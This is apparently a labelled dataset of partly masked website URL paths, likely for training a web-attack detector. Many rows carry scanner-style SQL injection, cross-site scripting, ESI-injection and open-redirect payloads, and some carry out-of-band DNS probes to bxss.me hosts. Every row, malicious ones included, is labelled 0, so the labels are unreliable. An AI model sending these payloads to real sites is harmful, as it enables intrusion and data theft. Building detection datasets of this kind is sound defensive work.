sentences	labels
socket.gethostbyname(""hitde"" ""mluirsua1ba1e.bxss.me."")[3].to_s) ""/****/10/11/art_34_242318.html 	 0
index/******/2021/11/17/javascript:void(); 	 0
xwzx'||'/****/2021_mtgz/202105/t20210505_273338.html 	 0
gygj/config-browser/showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
module/*****/'""()&%<acx><script >gejm(9283)</script>/jquery.ad-gallery.js 	 0
jsearchfront'||'/********/jcse/110105008056111/16/images/plugin/voice/voicerecorder.js 	 0
qhsw/******/2020/07/21/javascript:void(); 	 0
xxgk/******/list.html?new=/xfs.bxss.me 	 0
article/******/202007222122341228.html 	 0
module/**********/visit.jsp?i_webid[0]==extractvalue(1,concat(char(126),md5(1585232043)))and 3 in &i_columnid=1&i_webid[1]=3&type=1 	 0
module/**********/visit.jsp?i_articleid=242398&i_columnid=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&i_webid=1&type=3 	 0
xwdt/****/csjs/gzdt/13.htm 	 0
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448%' or 4576=4576 and '%%'='% 	 0
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(390)">?_=1630311387505 	 0
jsearchfront/*********/census.do?redirectaction:http://static.bxss.me/ 	 0
gjjtwzq/*****/index.php?o=panel&a=receiver.edit&id=alert(777) 	 0
0""xor(if(now()=sysdate(),sleep(12),0))xor""z/****/jzgl/gzdt/1.htm 	 0
zwfw' and 2*3*8=6*8 and 'xsle'='xsle/****/1.htm 	 0
nul/*****/ccmanage.php?find_enc=1&list=1"><script>alert(777)</script> 	 0
e/******/addinfo.php?submit=添加信息&classid=1&enews=maddinfo&mid='""()&%<acx><script >87cm(9833)</script> 	 0
zwgk/*******/zfxxgkzd/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm 	 0
zwgk/****/znjs' and 2*3*8=6*8 and 'fbxf'='fbxf.htm 	 0
zwgk/zfxxgk<esi:include src=""http://*******/rpb.png""/>/fdzdgknr/qtfdxx/ 	 0
jsearchfront/********/jcse/110105008056111/16/images/plugin/websitechange/zwfwv3.js/""><script>alert(4710)</script> 	 0
xwzx/****/2020_szyw/ and 1=1 	 0
jsearchfront/********/jcse/110105008056111/**/and/**/7659=7659/16/images/view.js 	 0
jsearchfront/********/jcse/110105008056111/16/'""()&%<acx><script >qamc(9033)</script>/main.css 	 0
xxgk/******/tjj/zfxxgkml_2127/lzyj/list.html?new=bxss.me/t/xss.html? 	 0
ldzc/*****/http://bxss.me/t/fit.txt?.jpg/202108/t20210806_185416.html 	 0
qhly/******/2017/04/05/javascript:window.print() 	 0
socket.gethostbyname('hitcx' 'aetwgyshf3a9b.bxss.me.')[3].to_s) '/******/result.css 	 0
xxgk/*****/1088/1091/list.html?new=0.23628304015921864'""()&%<acx><script >grpf(9380)</script> 	 0
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448') or 4394=0062 and '1'='1 	 0
2021zt/******/2021/09/10/javascript:window.print() 	 0
qhly/******/2008/01/04/javascript:window.print() 	 0
0""xor(if(now()=sysdate(),sleep(12),0))xor""z/******/ywdt/11.htm 	 0
js/******/index.php?tid=default&lid=en_uk&f_email="">alert(777) 	 0
index/******/2021/01/21/013323672'""/>%uff1cscript%uff1ealert%uff081143%uff09%uff1c/script%uff1e.shtml 	 0
2017zt/***/javascript:void(0) 	 0
news/********/siluyiliao?page=1'"()&%<acu><script>9112(9131)</script> 	 0
js/*******/index.php?pagename=</script><script>alert(777)</script><!-- 	 0
zwgk/******/ncwywfgz/szss/plq/xmb_gzdxb%' and 2*3*8=6*8 and 'rneu'!='rneu%.htm 	 0
module/jslib'||'/********/jquery.ad-gallery2.css 	 0
news/********/gaocengdongtai?page=1' or 2462=2462 /* 	 0
vc/*******/lib/jquery/jquery.min.js 	 0
images/zh-cn/*******/;"style='acu:expre/**/ssion(x4cp(9599))'bad=" 	 0
con/*****/upgrade_unattended.php?db_type=<script>alert(777)</script> 	 0
z/******/index.shtml 	 0
socket.gethostbyname('hitmx' 'htrncijocc232.bxss.me.')[3].to_s) '/******/zmhdyc.html 	 0
index/******/2013/05/03/011077792.shtml 	 0
jsearchfront/'""()&%<acx><script >vpin(9807)</script>/****/110105008056111/16/images/plugin/waterpull/pinterest_grid.js 	 0
fxgg/********/javascript:void(0); 	 0
qhly/******/2021/11/24/javascript:dozoom(12) 	 0
zwgk/******/ncwywfgz%' and 2*3*8=6*8 and '0wrz'!='0wrz%/szss/plq/xmb_gzdxb.htm 	 0
index/******/2014/12/23/011591237.shtml?ivk_sa=1024320u 	 0
ywly/****/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 0
fr/****/201808/t20180808_194915.html' and 'x'='y 	 0
ssjn/*******/xxdj/ 	 0
module/***/jpage/bxss.me.js 	 0
outurl/****/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 0
system/********/js/news/if(now()=sysdate(),sleep(12),0).js 	 0
jsearchfront/********/bxss.me/110105008056111/16/images/common.js 	 0
ru/****/results.php?q='"--></style></script><script>alert(777)</script>&search=search&type=3 	 0
yqlj/*******/gvideos.php?gid=1 and 1=2 	 0
ztzl/****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
xwzx/****/201608/t20160804_93597.html' and 'x'='y 	 0
/***********/zzxxgk/tjj/zfxxgkml_2127/jytabljg_2061/list.html 	 0
z/191211-8/*****/543527http://bxss.me/t/xss.html? 	 0
module/*****/ckplayer/ckplayer.js/"><script>alert(4694)</script>?_=1630312101338 	 0
xwzx/****/2017hydt_6392/ 	 0
module/**********/visit.jsp?type=>"'><script>alert(2059)</script>&i_webid=>"'><script>alert(2059)</script>&i_columnid=>"'><script>alert(2059)</script>&i_articleid=>"'><script>alert(2059)</script> 	 0
socket.gethostbyname('hitoi' 'kglbxleaf7bf3.bxss.me.')[3].to_s) '/**/art_34_242318.html 	 0
xinanyanjiu/************/0'xor(if(now()=sysdate(),sleep(6),0))xor'z/index_2.html 	 0
news/********/xinhuaqiyezixun?page='""()&%<acx><script >dgqe(9340)</script> 	 0
socket.gethostbyname(""hitvw"" ""svhrikna978d3.bxss.me."")[3].to_s) ""/***/easyui/plugins/jquery.panel.js 	 0
yqlj/******/formwlansetup?apmode=0&band=2&ssid=&chan=11&macaddrvalue=&wlanmacclone=0&wlanmac=&automacclone=no&repeaterssid=&wllinkmac1=&wllinkmac2=&wllinkmac3=&wllinkmac4=&wllinkmac5=&wllinkmac6=&x=54&y=12&wlan-url=test>alert(777)test 	 0
module/**********/visit.jsp?type=1'; select @@version,1,1,1--&i_webid=1&i_columnid=1 	 0
gygj/****/ and 1=1 	 0
news/********/zhixun?page=1 and 6768=6768# 	 0
xxgk/byysqgk' and 2*3*8=6*8 and 'hoa6'='hoa6/*******/list.html 	 0
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(6509)">?_=1630312351836 	 0
pic/***/10/87/32/10873219_948757.jpg 	 0
newscenter/******/2021/11/13/javascript:window.print() 	 0
ldzc/*****/201611/t20161121_76519.html?leader='.gethostbyname(lc('hitdz'.'hrceevxs76832.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(116).chr(68).chr(113).chr(86).' 	 0
qhly/******/2016/11/10/javascript:window.close(); 	 0
xxgk/******/tjj/?wvstest=javascript:domxssexecutionsink(1,""'/""><xsstag>()locxss"") 	 0
userfiles/****/twphp.cer 	 0
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime') and 4422=0276 and '1'='1&perpage=15&outlinepage=10 	 0
theme/**********/bxslider-4/jquery.bxslider.js 	 0
newscenter/******/2021/12/18/javascript:window.print() 	 0
ywly/****/xnygc/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
xxgk/*****/1088/1097/list.html?new=/xfs.bxss.me 	 0
jsearchfront/********/jcse/110105008056111/16/images'""()&%<acx><script >uzie(9579)</script>/main.css 	 0
uploadfiles/*****/about_img.jpg 	 0
zwgk/*******/t/xss.html? 	 0
xxgk/******/tjj/zfxxgkml_if(now()=sysdate(),sleep(15),0)/hygq_2064/list.html 	 0
vc//***********/css/page.css 	 0
e/******/viewclick/?addclick=1&classid=-1); waitfor delay '0:0:8.394' -- &id=1285 	 0
ztzl/****/dtbb/jtdt/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
was5/***/search?page=2&channelid=253477&searchword=1%' or 2101=2101 /*&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 0
